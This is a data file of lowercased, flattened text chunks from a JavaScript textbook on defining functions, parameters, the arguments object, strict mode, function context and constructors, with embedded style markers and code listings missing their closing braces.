!@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-3.2.1.txt__4": "add: function(fn) {  if (!fn.id) {  fn.id = this.nextid++;  this.cache[fn.id] = fn;  return true;  ...", "javascript-3.2.2.txt__1": "3.2.2. self-memoizing functions", "javascript-3.2.2.txt__2": "as an example, let's look at a simplistic (and certainly not particularly efficient) algorithm for computing prime numbers. although this is a simple example of a complex calculation, this technique is readily applicable to other expensive computations (such as deriving the md5 hash for a string) that are too complex to present here.", "javascript-3.3.1.txt__1": "3.3.1. function declarations and function expressions  the two most common ways of defining functions in javascript are by using function declarations and function expressions. these two techniques are so similar that often we don't even make a distinction between them, but as you'll see in the following chapters, subtle differences exist.  function declarations", "javascript-3.3.1.txt__2": "figure 3.4. the function declaration stands on its own, as a separate block of javascript code! (it can be contained within other functions.)  a couple of function declaration examples are shown in the following listing.  listing 3.4. examples of function declarations  function samurai() {  #a  return \"samurai here\";  #a  function ninja() {  #b  function hiddenninja() {  #c  return \"ninja here\";  #c  #c  return hiddenninja();  #a - defines function samurai in the global code  #b - defines function ninja in the global code  #c - defines function hiddenninja within the ninja function  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  if you take a closer look, you'll see something that you might not be accustomed to, if you haven't had much exposure to functional languages: a function defined within another function!  function ninja() {  function hiddenninja() {  return \"ninja here\";  return hiddenninja();  in javascript, this is perfectly normal, and we've used it here to again emphasize the importance of functions in javascript.  note  having functions contained in other functions might raise some tricky questions regarding scope and identifier resolution, but save them for now, because we'll revisit this case in detail in chapter 5.  function expressions", "javascript-3.3.1.txt__3": "var a = 3;  myfunction(4);  so too we can use function literals, in the same locations  var a = function() {};  myfunction(function(){});", "javascript-3.3.1.txt__4": "the following listing shows the differences between function declarations and function expressions.  listing 3.5. function declarations and function expressions  function myfunctiondeclaration(){  #a  function innerfunction() {}  #b  var myfunc = function(){};  #c  myfunc(function(){  #d  return function(){};  #e  });  (function namedfunctionexpression () {  #f  })();  #f  +function(){}();  #g  -function(){}();  #g  !function(){}();  #g  ~function(){}();  #g  #a - standalone function declaration  #b - inner function declaration  #c - function expression as a part of a variable declaration assignment  #d - function expression as an argument of a function call  #e - function expression as a function return value  #f - named function expression as part of a function call that will be immediately invoked  #g - function expressions that will be immediately invoked, as arguments to unary operators  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":9,\\\"ch\\\":10},{\\\"line\\\":9,\\\"ch\\\":33}]]\"}  !@%style%@!  this example code begins with a standard function declaration that contains another inner function declaration:  function myfunctiondeclaration(){  function innerfunction() {}  here you can see how function declarations are separate statements of javascript code, but can be contained within the body of other functions.  in contrast are function expressions, which are always a part of another statement. they're placed on the expression level, as the right side of a variable declaration (or an assignment):  var myfunc = function(){};  or as an argument to another function call, or as a function return value:  myfunc(function() {  return function(){};  });  besides the position in code where they're placed, there's one more difference between function declarations and function expressions: for function declarations, the function name is mandatory, whereas for function expressions it's completely optional.  function declarations must have a name defined because they stand on their own. because one of the basic requirements for a function is that it has to be invokable, we have to have a way to reference it, and the only way to do this is through its name.  function expressions, on the other hand, are parts of other javascript expressions, so we have alternative ways to invoke them. for example, if a function expression is assigned to a variable, we can use that variable to invoke the function:  var donothing = function(){};  donothing();  or, if it's an argument to another function, we can invoke it within that function through the matching parameter name:  function dosomething(action) {  action();  immediate functions  function expressions can even be placed in positions where they look a bit weird at first, such as at a location where we'd normally expect a function identifier. let's stop and take a closer look at that construct (see figure 3.5).  figure 3.5. a comparison of a standard function call and an immediate call to a function expression", "javascript-3.3.1.txt__5": "parentheses around function expressions", "javascript-3.3.1.txt__6": "there's also an alternative, even simpler way (yet, strangely, a little less often used) of achieving the same goal: (function(){}(3)). by wrapping the immediate function definition and call within parentheses, you can also notify the javascript parser that it's dealing with an expression.  the last four expressions in listing 3.5 are variations of the same theme of immediately invoked function expressions often found in various javascript libraries:  +function(){}();  -function(){}();  !function(){}();  ~function(){}();", "javascript-3.3.2.txt__1": "3.3.2. arrow functions  note  arrow functions are an es6 addition to the javascript standard (for browser compatibility, see http://mng.bz/8bnh).  because in our javascript we use a lot of functions, it makes sense to add some syntactic sugar that enables us to create functions in a shorter, more succinct way, thus making our lives as developers more pleasant.  in a lot of ways, arrow functions are a simplification of function expressions. let's revisit our sorting example from the first section of this chapter:  var values = [0, 3, 2, 5, 7, 4, 8, 1];  values.sort(function(value1,value2){  return value1 \u2013 value2;  });  this example uses a callback function expression sent to the sort method of the array object; this callback will be invoked by the javascript engine to sort the values of the array in descending order.  now let's see how to do the exact same thing with arrow functions:  var values = [0, 3, 2, 5, 7, 4, 8, 1];  values.sort((value1,value2) => value1 \u2013 value2);  see how much more succinct this is?", "javascript-3.3.2.txt__2": "now let's deconstruct the syntax of an arrow function, starting with the simplest possible way:  param => expression  this arrow function takes a parameter and returns the value of an expression. we can use this syntax as shown in the following listing.  listing 3.6. comparing an arrow function and a function expression  var greet = name => \"greetings \" + name;  #a  assert(greet(\"oishi\") === \"greetings oishi\", \"oishi is properly greeted\");  var anothergreet = function(name){  #b  return \"greetings \" + name;  #b  };  #b  assert(anothergreet(\"oishi\") === \"greetings oishi\",  \"again, oishi is properly greeted\");  #a - defines an arrow function  #b - defines a function expression  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":12},{\\\"line\\\":0,\\\"ch\\\":39}]]\"}  !@%style%@!  take a while to appreciate how arrow functions make code more succinct, without sacrificing clarity. that's the simplest version of the arrow function syntax, but in general, the arrow function can be defined in two ways, as shown in figure 3.6.  figure 3.6. the syntax of an arrow function", "javascript-3.3.2.txt__3": "after the fat-arrow operator, we have two options. if it's a simple function, we put an expression there (a mathematical operation, another function invocation, whatever), and the result of the function invocation will be the value of that expression. for instance, our first arrow function example has the following arrow function:", "javascript-3.3.txt__1": "3.3. defining functions", "javascript-3.3.txt__2": "javascript provides a couple of ways to define functions, which can be divided into four groups:  function declarations and function expressions\u2014the two most common, yet subtly different ways of defining functions. often people don't even consider them as separate, but as you'll see, being aware of their differences can help us understand when our functions are available for invocation:  function myfun(){ return 1;}  arrow functions (often called lambda functions)\u2014a recent, es6 addition to the javascript standard that enables us to define functions with far less syntactic clutter. they even solve one common problem with callback functions, but more on that later:  myarg => myarg*2  function constructors\u2014 a not-so-often used way of defining functions that enables us to dynamically construct a new function from a string that can also be dynamically generated. this example dynamically creates a function with two parameters, a and b, that returns the sum of those two parameters:  new function('a', 'b', 'return a + b')", "javascript-3.3.txt__3": "function* mygen(){ yield 1; }  it's important that you understand these differences, because the way in which a function is defined significantly influences when the function is available to be invoked and how it behaves, as well as on which object the function can be invoked.", "javascript-3.3.txt__4": "that leaves us with function constructors, a javascript feature that we'll skip entirely. although it has some interesting applications, especially when dynamically creating and evaluating code, we consider it a corner feature of the javascript language. if you want to know more about function constructors, visit http://mng.bz/zn8e.", "javascript-3.4.1.txt__1": "3.4.1. rest parameters  note  rest parameters are added by the es6 standard (for browser compatibility, see http://mng.bz/3go1).  for our next example, we'll build a function that multiplies the first argument with the largest of the remaining arguments. this probably isn't something that's particularly applicable in our applications, but it's an example of yet more techniques for dealing with arguments within a function.", "javascript-3.4.1.txt__2": "listing 3.7. using rest parameters  function multimax(first, ...remainingnumbers){  #a  var sorted = remainingnumbers.sort(function(a, b){  return b \u2013 a;  #b  });  return first * sorted[0];  assert(multimax(3, 1, 2, 3) == 9,  #c  \"3*3=9 (first arg, by largest.)\");  #a - rest parameters are prefixed with \u2026  #b - sort the remaining numbers, descending.  #c - the function is called just like any other function.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":27},{\\\"line\\\":0,\\\"ch\\\":30}]]\"}  !@%style%@!  by prefixing the last-named argument of a function with an ellipsis (...), we turn it into an array called the rest parameters, which contains the remaining passed-in arguments.  function multimax(first, ...remainingnumbers){  ...", "javascript-3.4.2.txt__1": "3.4.2. default parameters  note  default parameters are added by the es6 standard (for browser compatibility, see http://mng.bz/wi8w).", "javascript-3.4.2.txt__2": "our little example with slider component settings is just a specific case of a situation in which almost all function calls use the same value for a particular parameter (notice the emphasis on almost). consider a simpler case in which most of our ninjas are used to skulking around, but not yagyu, who cares only about simple sneaking:", "javascript-3.4.2.txt__3": "function  performaction(ninja, action) {  return ninja + \" \" + action;  performaction(\"fuma\", \"skulking\");  performaction(\"yoshi\", \"skulking\");  performaction(\"hattori\", \"skulking\");  performaction(\"yagyu\", \"sneaking\");  doesn't it seem tedious to always have to repeat the same argument, skulking, simply because yagyu is obstinate and refuses to act like a proper ninja?", "javascript-3.4.2.txt__4": "listing 3.8. tackling default parameters before es6  function performaction(ninja, action){  action = typeof action === \"undefined\" ? \"skulking\" : action;  #a  return ninja + \" \" + action;  assert(performaction(\"fuma\") === \"fuma skulking\",  #b  \"the default value is used for fuma\");  #b  #b  assert(performaction(\"yoshi\") === \"yoshi skulking\",  #b  \"the default value is used for yoshi\");  #b  assert(performaction(\"hattori\") === \"hattori skulking\",  #b  \"the default value is used for hattori\");  #b  assert(performaction(\"yagyu\", \"sneaking\") === \"yagyu sneaking\",  #c  \"yagyu can do whatever he pleases, even sneak!\");  #c  #a - if the action parameter is undefined, we use a default value, skulking, and if it's defined, we keep the passed-in value.  #b - we haven't passed in a second argument, the value of the action parameter; after executing the first function, the body statement will default to skulking.  #c - pass a string as the value of the action parameter; that value will be used throughout the function body.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-3.4.2.txt__5": "note  the typeof operator returns a string indicating the type of the operand. if the operand isn't defined (for example, if we haven't supplied a matching argument for a function parameter), the return value is the string undefined.  this is a commonly occurring pattern that's tedious to write, so the es6 standard has added support for default parameters, as shown in the following listing.  listing 3.9. tackling default parameters in es6  function performaction(ninja, action = \"skulking\"){  #a  return ninja + \" \" + action;  assert(performaction(\"fuma\") === \"fuma skulking\",  #b  \"the default value is used for fuma\");  #b  #b  assert(performaction(\"yoshi\") === \"yoshi skulking\",  #b  \"the default value is used for yoshi\");  #b  #b  assert(performaction(\"hattori\") === \"hattori skulking\",  #b  \"the default value is used for hattori\");  #b  assert(performaction(\"yagyu\", \"sneaking\") === \"yagyu sneaking\",  #c  \"yagyu can do whatever he pleases, even sneak!\");  #c  #a - in es6, it's possible to assign a value to a function parameter.  #b - if the value isn't passed in, the default value is used.  #c - the passed value is used.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":2},{\\\"line\\\":0,\\\"ch\\\":53}]]\"}  !@%style%@!  here you can see the syntax of default function parameters in javascript. to create a default parameter, we assign a value to a function parameter:  function performaction(ninja, action = \"skulking\"){  return ninja + \" \" + action;  then, when we make a function call and the matching argument value is left out, as with fuma, yoshi, and hattori, the default value (in this case, skulking), is used:  assert(performaction(\"fuma\") === \"fuma skulking\",  \"the default value is used for fuma\");  assert(performaction(\"yoshi\") === \"yoshi skulking\",  \"the default value is used for yoshi\");  assert(performaction(\"hattori\") === \"hattori skulking\",  \"the default value is used for hattori\");  if, on the other hand, we specify the value, the default value is overridden:  assert(performaction(\"yagyu\", \"sneaking\") === \"yagyu sneaking\",  \"yagyu can do whatever he pleases, even sneak!\");", "javascript-3.4.2.txt__6": "listing 3.10. referencing previous default parameters  function performaction(ninja, action = \"skulking\",  message = ninja + \" \" + action) {  #a  return message;  assert(performaction(\"yoshi\") === \"yoshi skulking\", \"yoshi is skulking\");  #a - we can place arbitrary expressions as default parameter values, in the process even referencing previous function parameters.  !@%style%@!", "javascript-3.4.2.txt__7": "!@%style%@!", "javascript-3.4.txt__1": "3.4. arguments and function parameters  when discussing functions, we often use the terms argument and parameter almost interchangeably, as if they were more or less the same thing. but now, let's be more formal:  a parameter is a variable that we list as part of a function definition.  an argument is a value that we pass to the function when we invoke it.  figure 3.7 illustrates the difference.  figure 3.7. the difference between function parameters and function arguments  as you can see, a function parameter is specified with the definition of the function, and all types of functions can have parameters:  function declarations (the ninja parameter to the skulk function)  function expressions (the person and action parameters to the perform-action function)  arrow functions (the daimyo parameter)  arguments, on the other hand, are linked with the invocation of the function; they're values passed to a function at the time of its invocation:  the string hattori is passed as an argument to the skulk function.  the string oda nobunaga is passed as an argument to the rule function.  the parameter ninja of the skulk function is passed as an argument to the performaction function.  when a list of arguments is supplied as a part of a function invocation, these arguments are assigned to the parameters in the function definition in the order specified. the first argument gets assigned to the first parameter, the second argument to the second parameter, and so on.", "javascript-3.4.txt__2": "figure 3.8. arguments are assigned to function parameters in the order specified. excess arguments aren't assigned to any parameters.", "javascript-3.4.txt__3": "on the other hand, if we have more parameters than arguments, the parameters that have no corresponding argument are set to undefined. for example, if we were to make the call practice(\"yoshi\"), the parameter ninja would be assigned the value yoshi, while the parameters weapon and technique would be set to undefined.", "javascript-4.1.1.txt__1": "4.1.1. the arguments parameter", "javascript-4.1.1.txt__2": "the arguments object has a property named length that indicates the exact number of arguments. the individual argument values can be obtained by using array indexing notation; for example, arguments[2] would fetch the third parameter. take a look at the following listing.  listing 4.1. using the arguments parameter  function whatever(a, b, c){  #a  assert(a === 1, 'the value of a is 1');  #b  assert(b === 2, 'the value of b is 2');  #b  assert(c === 3, 'the value of c is 3');  #b  assert(arguments.length === 5,  #c  'we've passed in 5 parameters');  #c  assert(arguments[0] === a,  #d  'the first argument is assigned to a');  #d  assert(arguments[1] === b,  #d  'the second argument is assigned to b');  #d  assert(arguments[2] === c,  #d  'the third argument is assigned to c');  #d  assert(arguments[3] === 4,  #e  'we can access the fourth argument');  #e  assert(arguments[4] === 5,  #e  'we can access the fifth argument');  #e  whatever(1,2,3,4,5);  #f  #a - declares a function with three parameters: a, b, and c  #b - tests for correct values  #c - in all, the function is passed five arguments.  #d - checks that the first three arguments match the function parameter  #e - checks that the excess arguments can be accessed through the arguments parameter  #f - calls a function with five arguments  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we have a whatever function that gets called with five arguments, whatever (1,2,3,4,5), even though it has only three declared parameters, a, b, c:  function whatever(a, b, c){  ...  we can access the first three arguments through their respective function parameters, a, b, and c:  assert(a === 1, 'the value of a is 1');  assert(b === 2, 'the value of b is 2');  assert(c === 3, 'the value of c is 3');  we can also check how many arguments in total were passed to the function by using the arguments.length property.  the arguments parameter can also be used to access each individual argument through array notation. it's important to note that this also includes the excess arguments that aren't associated with any function parameters:  assert(arguments[0] === a, 'the first argument is assigned to a');  assert(arguments[1] === b, 'the second argument is assigned to b');  assert(arguments[2] === c, 'the third argument is assigned to c');  assert(arguments[3] === 4, 'we can access the fourth argument');  assert(arguments[4] === 5, 'we can access the fifth argument');", "javascript-4.1.1.txt__3": "as we've already mentioned, the main point of the arguments object is to allow us to access all arguments that were passed to the function, regardless of whether a particular argument is associated with a function parameter. let's see how to do this by implementing a function that can calculate the sum of an arbitrary number of arguments.", "javascript-4.1.1.txt__4": "listing 4.2. using the arguments object to perform operations on all function arguments  function sum() {  #a  var sum = 0;  for(var i = 0; i < arguments.length; i++){  #b  sum += arguments[i];  #b  #b  return sum;  assert(sum(1, 2) === 3, \"we can add two numbers\");  #c  assert(sum(1, 2, 3) === 6, \"we can add three numbers\");  #c  assert(sum(1, 2, 3, 4) === 10, \"we can add four numbers\");  #c  #a - a function without any explicitly defined parameters  #b - iterates through all arguments passed, and accesses individual items through index notation  #c - calls the function with any number of arguments  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we first define a sum function that doesn't explicitly list any parameters. regardless of this, we can still access all function arguments through the arguments object. we iterate through all the arguments and calculate their sum.  now comes the payoff. we can call the function with any number of arguments, so we test a couple of cases to see if everything works. this is the true power of the arguments object. it allows us to write more versatile and flexible functions that can easily deal with different situations.  note", "javascript-4.1.1.txt__5": "now that we understand how the arguments object works, let's explore some of its gotchas.  arguments object as an alias to function parameters  the arguments parameter has one curious feature: it aliases function parameters. if we set a new value to, for example, arguments[0], the value of the first parameter will also be changed. take a look at the following listing.  listing 4.3. the arguments object aliases function parameters  function infiltrate(person) {  assert(person === 'gardener',  #a  'the person is a gardener');  #a  assert(arguments[0] === 'gardener',  #a  'the first argument is a gardener');  #a  arguments[0] = 'ninja';  #b  #b  assert(person === 'ninja',  #b  'the person is a ninja now');  #b  assert(arguments[0] === 'ninja',  #b  'the first argument is a ninja');  #b  person = 'gardener';  #c  #c  assert(person === 'gardener',  #c  'the person is a gardener once more');  #c  assert(arguments[0] === 'gardener',  #c  'the first argument is a gardener again');  #c  infiltrate(\"gardener\");  #a - the person parameter has the value \u201cgardener\u201d sent as a first argument.  #b - changing the arguments object will also change the matching parameter.  #c - the alias works both ways.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-4.1.1.txt__6": "assert(person === 'gardener', 'the person is a gardener');  assert(arguments[0] === 'gardener', 'the first argument is a gardener');  because the arguments object is an alias for the function parameters, if we change the arguments object, the change is also reflected in the matching function parameter:  arguments[0] = 'ninja';  assert(person === 'ninja', 'the person is a ninja now');  assert(arguments[0] === 'ninja', 'the first argument is a ninja');  the same holds true in the other direction. if we change a parameter, the change can be observed in both the parameter and the arguments object:  person = 'gardener';  assert(person === 'gardener',  'the person is a gardener once more');  assert(arguments[0] === 'gardener',  'the first argument is a gardener again');  avoiding aliases  the concept of aliasing function parameters through the arguments object can be confusing, so javascript provides a way to opt out of it by using strict mode.  strict mode", "javascript-4.1.1.txt__7": "as always, let's take a look at a simple example.  listing 4.4. using strict mode to avoid arguments aliasing  \"use strict\";  #a  function infiltrate(person){  assert(person === 'gardener',  #b  'the person is a gardener');  #b  assert(arguments[0] === 'gardener',  #b  'the first argument is a gardener');  #b  arguments[0] = 'ninja';  #c  assert(arguments[0] === 'ninja',  #d  'the first argument is now a ninja');  #d  assert(person === 'gardener',  #e  'the person is still a gardener');  #e  infiltrate(\"gardener\");  #a - enables strict mode  #b - the person argument and the first argument start with the same value.  #c - changes the first argument  #d - the first argument is changed.  #e - the value of the person parameter hasn't changed.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":8,\\\"ch\\\":2},{\\\"line\\\":8,\\\"ch\\\":25}],[{\\\"line\\\":3,\\\"ch\\\":2},{\\\"line\\\":3,\\\"ch\\\":31}],[{\\\"line\\\":13,\\\"ch\\\":2},{\\\"line\\\":13,\\\"ch\\\":31}],[{\\\"line\\\":14,\\\"ch\\\":4},{\\\"line\\\":14,\\\"ch\\\":38}]]\"}  !@%style%@!", "javascript-4.1.2.txt__1": "4.1.2. the this parameter: introducing the function context", "javascript-4.1.2.txt__2": "the function context is a notion that those coming from object-oriented languages such as java might think that they understand. in such languages, this usually points to an instance of the class within which the method is defined.", "javascript-4.1.txt__1": "4.1. using implicit function parameters", "javascript-4.1.txt__2": "by implicit, we mean that these parameters aren't explicitly listed in the function signature, but are silently passed to the function and accessible within the function. they can be referenced within the function just like any other explicitly named parameter. let's take a look at each of these implicit parameters in turn.", "javascript-4.2.1.txt__1": "4.2.1. invocation as a function", "javascript-4.2.1.txt__2": "this type of invocation occurs when a function is invoked using the () operator, and the expression to which the () operator is applied doesn't reference the function as a property of an object. (in that case, we'd have a method invocation, but we discuss that next.) here are some simple examples:  function ninja(){};  #a  ninja();  #a  var samurai = function(){};  #b  samurai();  #b  (function(){})()  #c  #a - function declaration invoked as a function  #b - function expression invoked as a function  #c - immediately invoked function expression, invoked as a function  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  when invoked in this manner, the function context (the value of the this keyword) can be two things: in nonstrict mode, it will be the global context (the window object), whereas in strict mode, it will be undefined.  the following listing illustrates the difference in behavior between strict and nonstrict modes.  listing 4.5. invocation as a function  function ninja() {  #a  return this;  #a  #a  function samurai() {  #b  \"use strict\";  #b  return this;  #b  #b  assert(ninja() === window,  #c  \"in a 'nonstrict' ninja function, \" +  #c  \"the context is the global window object\");  #c  assert(samurai() === undefined,  #d  \"in a 'strict' samurai function, \" +  #d  \"the context is undefined\");  #d  #a - a function in nonstrict mode  #b - a function in strict mode  #c - as expected, a nonstrict function has window as the function context.  #d - the strict function, on the other hand, has an undefined context.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  note", "javascript-4.2.2.txt__1": "4.2.2. invocation as a method  when a function is assigned to a property of an object and the invocation occurs by referencing the function using that property, then the function is invoked as a method of that object. here's an example:  var ninja = {};  ninja.skulk = function(){};  ninja.skulk();", "javascript-4.2.2.txt__2": "let's consider some test code in the next listing to illustrate the differences and similarities between invocation as a function and invocation as a method.  listing 4.6. the differences between function and method invocations  function whatsmycontext() {  #a  return this;  #a  #a  assert(whatsmycontext() === window,  #b  \"function call on window\");  #b  var getmythis = whatsmycontext;  #c  assert(getmythis() === window,  #d  \"another function call in window\");  #d  var ninja1 = {  #e  getmythis: whatsmycontext  #e  };  #e  assert(ninja1.getmythis() === ninja1,  #f  \"working with 1st ninja\");  #f  var ninja2 = {  #g  getmythis: whatsmycontext  #g  };  #g  assert(ninja2.getmythis() === ninja2,  #h  \"working with 2nd ninja\");  #h  #a - returns the function context that will allow us to examine the context from outside  #b - invoking as a function sets the context to the window object.  #c - getmythis gets a reference to the whatsmycontext function.  #d - invokes the function using the getmythis variable. even though we use a variable, the function is still invoked as a function, and the function context is the window object.  #e - a ninja1 object is created with a getmythis property that references the whatsmycontext function.  #f - invoking the functions through getmythis calls it as a method of ninja1. the function context is now ninja1. that's object orientation!  #g - another object, ninja2, also has a getmythis property referencing whatsmycontext.  #h - invoking the function as a method of ninja2 shows that the function context is now ninja2.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-4.2.2.txt__3": "function whatsmycontext() {  return this;  when we call the function directly by name, this is a case of invoking the function as a function, so we expect that the function context will be the global context (window), because we're in nonstrict mode. we assert that this is so:  assert(whatsmycontext() === window, ...)  then we create a reference to the function whatsmycontext in a variable named getmythis: var getmythis = whatsmycontext. this doesn't create a second instance of the function; it merely creates a reference to the same function (you know, first-class object and all).  when we invoke the function via the variable\u2014something we can do because the function invocation operator can be applied to any expression that evaluates to a function\u2014we're once again invoking the function as a function. as such, we again expect that the function context is window, and it is:  assert(getmythis() === window,  \"another function call in window\");", "javascript-4.2.2.txt__4": "var ninja1 = {  getmythis: whatsmycontext  };  according to what we stated earlier, when we invoke the function via a method reference, we expect the function context to be the method's object (in this case, ninja1) and we assert as much:  assert(ninja1.getmythis() === ninja1,  \"working with 1st ninja\");  note  invoking functions as methods is crucial to writing javascript in an object-oriented manner. doing so enables you to use this within any method to reference the method's \u201cowning\u201d object\u2014a fundamental concept in object-oriented programming.  to drive that point home, we continue testing by creating yet another object, ninja2, also with a property named getmythis that references the whatsmycontext function. upon invoking this function through the ninja2 object, we correctly assert that its function context is ninja2:  var ninja2 = {  getmythis: whatsmycontext  };  assert(ninja2.getmythis() === ninja2,  \"working with 2nd ninja\");", "javascript-4.2.2.txt__5": "though a powerful capability, the manner in which it's used in this example has limitations. foremost, when we create the two ninja objects, we're able to share the same function to be used as a method in each, but we have to use a bit of repeated code to set up the separate objects and their methods.", "javascript-4.2.2.txt__6": "but that's nothing to despair over\u2014javascript provides mechanisms to make creating objects from a single pattern much easier than in this example. we'll explore those capabilities in depth in chapter 7. but for now, let's consider a part of that mechanism that relates to function invocations: the constructor.", "javascript-4.2.3.txt__1": "4.2.3. invocation as a constructor", "javascript-4.2.3.txt__2": "to invoke the function as a constructor, we precede the function invocation with the keyword new. for example, recall the whatsmycontext function from the previous section:  function whatsmycontext(){ return this; }  if we want to invoke the whatsmycontext function as a constructor, we write this:  new whatsmycontext();  but even though we can invoke whatsmycontext as a constructor, that function isn't a particularly useful constructor. let's find out why by discussing what makes constructors special.  note", "javascript-4.2.3.txt__3": "the superpowers of constructors  invoking a function as a constructor is a powerful feature of javascript that we'll explore in the following listing.  listing 4.7. using a constructor to set up common objects  function ninja() {  #a  this.skulk = function() {  #a  return this;  #a  };  #a  #a  var ninja1 = new ninja();  #b  var ninja2 = new ninja();  #b  assert(ninja1.skulk() === ninja1,  #c  \"the 1st ninja is skulking\");  #c  assert(ninja2.skulk() === ninja2,  #c  \"the 2nd ninja is skulking\");  #c  #a - a constructor that creates a skulk property on whatever object is the function context. the method once again returns the function context so that we can test it externally.  #b - creates two objects by invoking the constructor with new. the newly created objects are referenced by ninja1 and ninja2.  #c - tests the skulk method of the constructed objects. each should return its own constructed object.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-4.2.3.txt__4": "in general, when a constructor is invoked, a couple of special actions take place, as shown in figure 4.1. calling a function with the keyword new triggers the following steps:  a new empty object is created.  this object is passed to the constructor as the this parameter, and thus becomes the constructor's function context.  the newly constructed object is returned as the new operator's value (with an exception that we'll get to in short order).  figure 4.1. when calling a function with a keyword new, a new empty object is created and set as the context of the constructor function, the this parameter.", "javascript-4.2.3.txt__5": "let's consider a more appropriate constructor, ninja, that sets up skulking ninjas, as shown in listing 4.7:  function ninja() {  this.skulk = function() {  return this;  };  the skulk method performs the same operation as whatsmycontext in the previous sections, returning the function context so that we can test it externally.  with the constructor defined, we create two new ninja objects by invoking the constructor twice. note that the returned values from the invocations are stored in variables that become references to the newly created ninjas:  var ninja1 = new ninja();  var ninja2 = new ninja();  then we run the tests that ensure that each invocation of the method operates on the expected object:  assert(ninja1.skulk() === ninja1,  \"the 1st ninja is skulking\");  assert(ninja2.skulk() === ninja2,  \"the 2nd ninja is skulking\");  that's it! now you know how to create and initialize new objects with constructor functions. calling a function with the keyword new returns the newly created object. but let's check whether that's always exactly true.  constructor return values", "javascript-4.2.3.txt__6": "listing 4.8. constructors returning primitive values  function ninja() {  #a  this.skulk = function () {  return true;  };  return 1;  #b  assert(ninja() === 1,  #c  \"return value honored when not called as a constructor\");  #c  var ninja = new ninja();  #d  assert(typeof ninja === \"object\",  #e  \"object returned when called as a constructor\");  #e  assert(typeof ninja.skulk === \"function\",  #e  \"ninja object has a skulk method\");  #e  #a - defines a constructor function named ninja  #b - the constructor returns a specific primitive value, the number 1.  #c - the function is called as a function and its return value is 1, as expected.  #d - the function is called as a constructor via the new operator.  #e - tests verify that the return value of 1 is ignored, and that a new, initialized object has been returned from new.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-4.2.3.txt__7": "but now let's try something different, a constructor function that returns another object, as shown in the following listing.  listing 4.9. constructors explicitly returning object values  var puppet = {  #a  rules: false  #a  };  #a  function emperor() {  #b  this.rules = true;  #b  return puppet;  #b  var emperor = new emperor();  #c  assert(emperor === puppet,  #d  \"the emperor is merely a puppet!\");  #d  assert(emperor.rules === false,  #d  \"the puppet does not know how to rule!\");  #d  #a - creates our own object with a known property  #b - returns that object despite initializing the object passed as this  #c - invokes the function as a constructor  #d - tests show that the object returned by the constructor is assigned to the variable emperor (and not the object created by the new expression).  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  this listing takes a slightly different approach. we start by creating a puppet object with the property rules set to false:  var puppet = {  rules: false  };  then we define an emperor function that adds a rules property to the newly constructed object and sets it to true. in addition, the emperor function has one quirk; it returns the global puppet object:  function emperor() {  this.rules = true;  return puppet;  later, we call the emperor function as a constructor, with the keyword new:  var emperor = new emperor();  with this, we've set up an ambiguous situation: we get one object passed to the constructor as the function context in this, which we initialize, but then we return a completely different puppet object. which object will reign supreme?  let's test it:  assert(emperor === puppet, \"the emperor is merely a puppet!\");  assert(emperor.rules === false,  \"the puppet does not know how to rule!\");  it turns out that our tests indicate that the puppet object is returned as the value of constructor invocation, and that the initialization that we performed on the function context in the constructor was all for naught. the puppet has been exposed!  now that we've gone through some tests, let's summarize our findings:  if the constructor returns an object, that object is returned as the value of the whole new expression, and the newly constructed object passed as this to the constructor is discarded.  if, however, a nonobject is returned from the constructor, the returned value is ignored, and the newly created object is returned.  because of these peculiarities, functions intended for use as constructors are generally coded differently from other functions. let's explore that in greater detail.  coding considerations for constructors", "javascript-4.2.3.txt__8": "function ninja() {  this.skulk = function() {  return this;  };  var whatever = ninja();", "javascript-4.2.3.txt__9": "because constructors are generally coded and used in a manner that's different from other functions, and aren't all that useful unless invoked as constructors, a naming convention has arisen to distinguish constructors from run-of-the-mill functions and methods. if you've been paying attention, you may have already noticed it.", "javascript-4.2.3.txt__10": "functions and methods are generally named starting with a verb that describes what they do (skulk, creep, sneak, dosomethingwonderful, and so on) and start with a lowercase letter. constructors, on the other hand, are usually named as a noun that describes the object that's being constructed and start with an uppercase character: ninja, samurai, emperor, ronin, and so on.", "javascript-4.2.3.txt__11": "it's easy to see how a constructor makes it more elegant to create multiple objects that conform to the same pattern without having to repeat the same code over and over. the common code is written just once, as the body of the constructor. in chapter 7, you'll see more about using constructors and about the other object-oriented mechanisms that javascript provides to make it even easier to set up object patterns.", 